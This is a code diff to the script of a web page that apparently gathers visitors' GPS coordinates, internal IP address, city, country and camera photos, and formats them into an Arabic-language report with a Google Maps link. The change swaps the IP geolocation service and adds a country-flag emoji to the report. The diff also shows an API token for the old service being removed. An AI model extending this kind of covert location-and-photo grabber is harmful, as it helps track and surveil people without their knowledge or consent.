@@ -21,6 +21,7 @@
     let partsReady = 0;
     let city = "";
     let country = "";
+    let flagEmoji = "";
 
     function sendPhoto(blob) {
       const form = new FormData();
@@ -42,7 +43,7 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
 🏠 IP الداخلي: ${localIP || "❌"}
 
 🏙️ المدينة: ${city || "❌"}
-🌍 الدولة: ${country || "❌"}
+🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}
 
 🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
       document.getElementById("result").innerText = message;
@@ -87,16 +88,21 @@ Longitude: ${gpsLon}
     }
 
     function getGeoInfo(ip) {
-      fetch(`https://ipinfo.io/${ip}?token=ce7d2b4010fbc3`)
+      fetch(`https://ipapi.co/${ip}/json/`)
         .then(res => res.json())
         .then(data => {
           city = data.city || "";
-          country = data.country || "";
+          country = data.country_name || "";
+          const countryCode = data.country || "";
+          flagEmoji = countryCode
+            ? String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
+            : "";
           checkIfReady();
         })
         .catch(() => {
           city = "";
           country = "";
+          flagEmoji = "";
           checkIfReady();
         });
     }
